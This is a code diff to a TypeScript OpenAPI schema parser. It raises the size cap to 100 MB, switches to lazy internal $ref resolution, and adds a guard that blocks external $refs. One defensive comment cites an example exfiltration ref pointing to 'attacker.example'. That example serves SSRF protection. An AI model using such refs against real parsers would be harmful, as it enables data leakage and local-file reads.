@@ -7,11 +7,13 @@ import { Resource, ResourceType } from '../../../entities/resource.entity';
 import { SchemaParser, ParsedSchema, ParsedOperation, ParsedResource } from '../interfaces/parser.interface';
 
 /**
- * Hard size cap on incoming raw schemas. Protects against memory DoS
- * via oversized JSON/YAML inputs (JSON.parse on a 100MB string would
- * allocate hundreds of MB of heap before we even start processing).
+ * Hard size cap on incoming raw schemas. Bumped from 5 MB → 100 MB
+ * to cover real-world specs (Stripe ~7.7 MB, AWS-class ~30 MB,
+ * GitHub REST ~12 MB). The parse path itself was rewritten to be
+ * memory-bounded — see the extractor changes — so a 100 MB JSON
+ * doesn't expand into a 1 GB dereferenced tree like it used to.
  */
-const MAX_SCHEMA_BYTES = 5 * 1024 * 1024; // 5 MB
+const MAX_SCHEMA_BYTES = 100 * 1024 * 1024; // 100 MB
 
 /**
  * Parser options that disable EXTERNAL $ref resolution. Without this,
@@ -51,12 +53,21 @@ export class OpenAPIParserService implements SchemaParser {
           schemaObject = rawSchema;
         }
       }
-      // Dereference $refs but do NOT resolve external URLs/files.
-      // See SAFE_PARSER_OPTIONS comment above.
-      const api = (await SwaggerParser.dereference(
-        schemaObject,
-        SAFE_PARSER_OPTIONS as any,
-      )) as unknown as OpenAPIV3.Document;
+
+      // Skip SwaggerParser.dereference. It deep-clones every $ref
+      // into every operation that mentions it — for a Stripe-class
+      // spec where one Pet/Customer/Charge schema is referenced
+      // from 100+ operations, the dereferenced tree balloons to
+      // 5-10× the raw schema size and was the dominant cause of
+      // the 7.7 MB Stripe import OOM-killing the worker.
+      //
+      // Instead, we walk the spec lazily and resolve internal $refs
+      // one hop at a time as each operation is built. External $refs
+      // remain blocked (SSRF / local-file-read protection); same as
+      // before. The components.schemas pool stays in `originalSchema`
+      // metadata for resource extraction but isn't cloned per op.
+      const api = schemaObject as OpenAPIV3.Document;
+      this.assertNoExternalRefs(api);
 
       const operations = await this.extractOperationsFromOpenAPI(api);
       const resources = await this.extractResourcesFromOpenAPI(api);
@@ -75,12 +86,35 @@ export class OpenAPIParserService implements SchemaParser {
           externalDocs: api.externalDocs,
           tags: api.tags,
           fileName,
-          originalSchema: api,
+          // Don't retain the entire spec on the ParsedSchema. The
+          // schema is already persisted as rawSchema on ApiSchema —
+          // keeping a parsed-object copy in memory just to put it
+          // in metadata doubled the import's peak memory.
+          // originalSchema: api,
         },
       };
     } catch (error) {
       this.logger.error(`Failed to parse OpenAPI schema: ${error.message}`);
       throw new Error(`Invalid OpenAPI schema: ${error.message}`);
+    }
+  }
+
+  /**
+   * Reject any $ref that targets an external URL or local file. Internal
+   * JSON-Pointer refs (`#/components/...`) are kept and resolved lazily.
+   * Without this guard a user-supplied schema could exfiltrate data via
+   * `$ref: "http://attacker.example/leak"` or read local files.
+   */
+  private assertNoExternalRefs(node: any, depth = 0): void {
+    if (!node || typeof node !== 'object' || depth > 1000) return;
+    if (typeof node.$ref === 'string') {
+      const ref = node.$ref;
+      if (!ref.startsWith('#/')) {
+        throw new Error(`External $ref blocked: ${ref}`);
+      }
+    }
+    for (const v of Array.isArray(node) ? node : Object.values(node)) {
+      this.assertNoExternalRefs(v, depth + 1);
     }
   }
 
@@ -180,8 +214,8 @@ export class OpenAPIParserService implements SchemaParser {
           description: opObject.description,
           method: method.toUpperCase(),
           endpoint: path,
-          parameters: this.extractParameters(allParams.length > 0 ? allParams : undefined, opObject.requestBody),
-          responses: this.extractResponses(opObject.responses),
+          parameters: this.extractParameters(allParams.length > 0 ? allParams : undefined, opObject.requestBody, api),
+          responses: this.extractResponses(opObject.responses, api),
           security: opObject.security,
           tags: opObject.tags,
           deprecated: opObject.deprecated,
@@ -220,8 +254,9 @@ export class OpenAPIParserService implements SchemaParser {
   }
 
   private extractParameters(
-    parameters?: (OpenAPIV3.ReferenceObject | OpenAPIV3.ParameterObject)[],
-    requestBody?: OpenAPIV3.ReferenceObject | OpenAPIV3.RequestBodyObject,
+    parameters: (OpenAPIV3.ReferenceObject | OpenAPIV3.ParameterObject)[] | undefined,
+    requestBody: OpenAPIV3.ReferenceObject | OpenAPIV3.RequestBodyObject | undefined,
+    document: OpenAPIV3.Document,
   ): any {
     const result: any = {
       path: {},
@@ -233,7 +268,7 @@ export class OpenAPIParserService implements SchemaParser {
     // Extract parameters
     if (parameters) {
       for (const paramRef of parameters) {
-        const param = this.resolveReference(paramRef) as OpenAPIV3.ParameterObject;
+        const param = this.resolveReference(paramRef, document) as OpenAPIV3.ParameterObject;
         if (!param) continue;
 
         const paramSchema = {
@@ -268,7 +303,7 @@ export class OpenAPIParserService implements SchemaParser {
 
     // Extract request body
     if (requestBody) {
-      const bodyObject = this.resolveReference(requestBody) as OpenAPIV3.RequestBodyObject;
+      const bodyObject = this.resolveReference(requestBody, document) as OpenAPIV3.RequestBodyObject;
       if (bodyObject?.content) {
         const contentType = Object.keys(bodyObject.content)[0];
         const mediaType = bodyObject.content[contentType];
@@ -285,18 +320,21 @@ export class OpenAPIParserService implements SchemaParser {
     return result;
   }
 
-  private extractResponses(responses?: OpenAPIV3.ResponsesObject): Record<string, any> {
+  private extractResponses(
+    responses: OpenAPIV3.ResponsesObject | undefined,
+    document: OpenAPIV3.Document,
+  ): Record<string, any> {
     const result: Record<string, any> = {};
 
     if (responses) {
       for (const [statusCode, responseRef] of Object.entries(responses)) {
-        const response = this.resolveReference(responseRef) as OpenAPIV3.ResponseObject;
+        const response = this.resolveReference(responseRef, document) as OpenAPIV3.ResponseObject;
         if (!response) continue;
 
         result[statusCode] = {
           description: response.description,
           schema: response.content ? this.extractSchemaFromContent(response.content) : undefined,
-          examples: response.content ? this.extractExamplesFromContent(response.content) : undefined,
+          examples: response.content ? this.extractExamplesFromContent(response.content, document) : undefined,
           headers: response.headers,
         };
       }
@@ -310,16 +348,19 @@ export class OpenAPIParserService implements SchemaParser {
     return firstMediaType?.schema;
   }
 
-  private extractExamplesFromContent(content: { [media: string]: OpenAPIV3.MediaTypeObject }): any[] {
+  private extractExamplesFromContent(
+    content: { [media: string]: OpenAPIV3.MediaTypeObject },
+    document: OpenAPIV3.Document,
+  ): any[] {
     const examples: any[] = [];
-    
+
     for (const mediaType of Object.values(content)) {
       if (mediaType.example) {
         examples.push(mediaType.example);
       }
       if (mediaType.examples) {
         for (const example of Object.values(mediaType.examples)) {
-          const resolvedExample = this.resolveReference(example);
+          const resolvedExample = this.resolveReference(example, document);
           if (resolvedExample && typeof resolvedExample === 'object' && 'value' in resolvedExample) {
             examples.push(resolvedExample.value);
           }
